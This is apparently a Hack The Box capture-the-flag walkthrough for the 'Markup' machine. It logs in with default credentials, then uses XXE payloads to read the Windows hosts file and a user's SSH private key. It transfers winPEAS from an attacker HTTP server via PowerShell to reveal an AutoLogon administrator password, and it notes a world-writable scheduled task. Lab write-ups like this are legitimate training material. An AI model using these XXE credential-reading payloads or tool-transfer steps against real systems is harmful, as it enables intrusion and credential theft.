# Markup
![hackthebox_logo](https://user-images.githubusercontent.com/83867734/141313996-2c2024f2-3775-4bfb-9809-5d51005379c3.png)


Machines
--
Attacker:
* Name: attacker_machine
* Operating System: Kali Linux
* IP Address: 10.10.15.64

Victim:
* Name: victim_machine
* IP Address: 10.129.95.192
* Other information must be gathered during the attack

Phase 1: Enumeration
--
On the attacker_machine:

    $ sudo nmap -sS 10.129.95.192 -vvv

    <SNIP>
    PORT    STATE SERVICE REASON
    22/tcp  open  ssh     syn-ack ttl 127
    80/tcp  open  http    syn-ack ttl 127
    443/tcp open  https   syn-ack ttl 127
    <SNIP>

The most important information is port 80/tcp and port 22/tcp (TFTP) opened. The first one means that it could expose a website that we can investigate, and the second one could be a way to enter in the server trying to catch credentials or private keys. Furthermore, looking for TTL on the result, the OS should be probably Windows-based.

For first, since port 80/tcp is opened, let's visit the IP address by the browser: http://10.129.95.192.

The URL shows an authentication form. By using tools like `gobuster` or `ffuf`, we didn't find anything useful. At this point we try to use the most common credentials and we find that using the `admin:password` credentials, we can access to the platform.

Inside it, there are different pages we can access to. We need to search for a page containing input forms. Here, two sections are interesting: "Order" and "Contact".

So, we should try to inject some strings to test for some vulnerability. Looking for these two sections, we can see that in "Order" section, the output is shown to the user; in "Contact" section, the output should be shown to the admin or support team (so it could be a Blind injection).

At this point, let's start to work on "Order" section. For first, let's analyze the page source: we can see the following comment:
```html
<SNIP>
<!-- Modified by Daniel : UI-Fix-9092-->
<SNIP>
```
It could suggest us that the server has an account named "Daniel" or "daniel".

Going forward, let's use Burpsuite to analyze the content of requests we send and related responses.

After setting Burpsuite to proxy the browser flowing data, fill forms with random information, for example:
```
Type of Goods: Home Appliances
Quantity: 10
Address: ASDASD
```
and click on "Submit". This request will be intercepted by Burpsuite if you set Intercept as ON. Otherwise, you can get the request information on "Proxy" -> "HTTP history" tab. The output from the browser will be "Your order for Home Appliances has been processed".

Inside this request, we can see the following POST data:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<order>
   <quantity>10</quantity>
   <item>Home Appliances</item>
   <address>ASDASD</address>
</order>
```
It could be prone to XXE Injection. Let's try to do a test:

Right-click on this request above inside Burpsuite and select "Send to Repeater" (CTRL+R) and move to "Repeater" tab. By referring https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection, edit the POST data in the following manner:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [
  <!ENTITY test "Home Appliances">
]>
<order>
   <quantity>10</quantity>
   <item>&test;</item>
   <address>ASDASD</address>
</order>
```
click on "Send" and the response will show "Your order for Home Appliances has been processed".

It means that the `<item>` form could be prone to XXE Injection. At this point, we can try to read the content of some file inside the target server. Remember that probably we are communicating to a Windows machine:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///C:/windows/system32/drivers/etc/hosts'>]>
<order>
   <quantity>10</quantity>
   <item>&xxe;</item>
   <address>HELLO THERE!</address>
</order>
```
By clicking on "Send" button, the response will be:
```
Your order for # Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#	127.0.0.1       localhost
#	::1             localhost
 has been processed
```
It means it works, `<item>` form is vulnerable.

Note: `&xxe;` variable works only on `<item>` form. On `<quantity>` and `<address>` forms does not, maybe because they are not vulnerable.

Note: for Windows machine, we used to check for `file:///C:/windows/system32/drivers/etc/hosts` file, but we could check also for `file:///c:/windows/win.ini` file or others.

Phase 2: Foothold
--
Now we have the following information: a possible username and SSH port opened.

At this point, we can try to search for Daniel account SSH private key. We can retrieve that by leveraging on the default path of SSH private key of users that is `C:/Users/<Account>/.ssh/id_rsa`.

Let's do that by XXE Injection. Inject the following POST data:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY example SYSTEM 'file:///C:/Users/Daniel/.ssh/id_rsa'>]>
<order>
   <quantity>10</quantity>
   <item>&example;</item>
   <address>HELLO THERE!</address>
</order>
```
The response output will contain the private key. Copy and paste it inside our attacker machine in a file named `id_rsa`.
To avoid the following error:
```
Permissions 0xxx for '<path>/id_rsa' are too open.
It is recommended that your private key files are NOT accessible by others.
This private key will be ignored.
```
you need to set `400` (only readable by you) or `600` (only writable by you) to `id_rsa`. Let's do it:
```
$ chmod 400 id_rsa
```
Then:
```
$ ssh -i id_rsa Daniel@10.129.95.192
```
You are inside the target server as "daniel". At this point, you can retrieve the user flag.

Phase 3: Privilege Escalation
--
The next step is pwning the system by escalating privileges to Administrator account. By searching for any interesting file inside the user folders, we cannot find anything of interest.

Since you are using Windows `cmd`, remember to use `type` for reading the content of files. If you want to swap to PowerShell, just type `powershell`.

By using `ping google.com` or `ping 8.8.8.8` command, we note that ping request could not find host google.com. It means that more likely the target machine cannot connect to Internet, so we cannot download any tools could be useful for our privilege escalation directly by Internet.
If we try to ping our attacker machine by `ping 10.10.15.64`, the attacker machine is pinged correctly from target machine. It means they are inside the same network.

At this point, we can transfer them by using our attacker machine as HTTP server and use some PowerShell command to download the tool to victim machine.

For first, let's use winPEAS tool. Let's download it on attacker machine:
```
$ wget https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Obfuscated%20Releases/winPEASany.exe
```
Run the HTTP server on the attacker machine:
```
$ python3 -m http.server 4000
```
Let's move to the SSH session on the victim machine and download the file from our HTTP server. Note that, if you receive some "Permission Denied" error on victim machine, download the file on the `C:\Users\Daniel\Downloads` or `C:\Users\Daniel\Desktop` folder.
By PowerShell, type:
```powershell
PS C:\Users\daniel\Desktop> wget http://10.10.15.64:4000/winPEASany.exe -UseBasicParsing -Out ./winPEASany.exe
```
or
```powershell
PS C:\Users\daniel\Desktop> Invoke-WebRequest http://10.10.15.64:4000/winPEASany.exe -OutFile ./winPEASany.exe
```
Then, run it:
```powershell
PS C:\Users\daniel\Desktop> .\winPEASany.exe 
```
From the output, one of most interesting parts is the following:
```
<SNIP>
+----------¦ Looking for AutoLogon credentials                                                                                                                                                                             
    Some AutoLogon credentials were found                                                                                                                                                                                         
    DefaultUserName               :  Administrator
    DefaultPassword               :  Yhk}QE&j<3M
<SNIP>
```
At this point, from our attacker machine we can connect by SSH:
```
ssh Administrator@10.129.95.192
```
Insert the password and you get access as Administrator and you can search the flag.

Note: inside C:\Log-Management folder there is `job.bat` file. Opening this file, we can note it is a scheduled task run as Administrator. On `cmd` if we run `schtasks`, we don't have the access grants for checking it. Assuming it is a scheduled task, if we check permissions on this file by:
```
daniel@MARKUP C:\Log-Management>icacls job.bat
job.bat BUILTIN\Users:(F)
        NT AUTHORITY\SYSTEM:(I)(F)
        BUILTIN\Administrators:(I)(F)
        BUILTIN\Users:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```
It means that all users in `BUILTIN\Users` group, as "Daniel" user, have Full Access permission (F), it means we can edit that file as we want and run the code inside it (an example:https://medium.com/@joemcfarland/markup-has-been-pwned-e7c6e763d25f).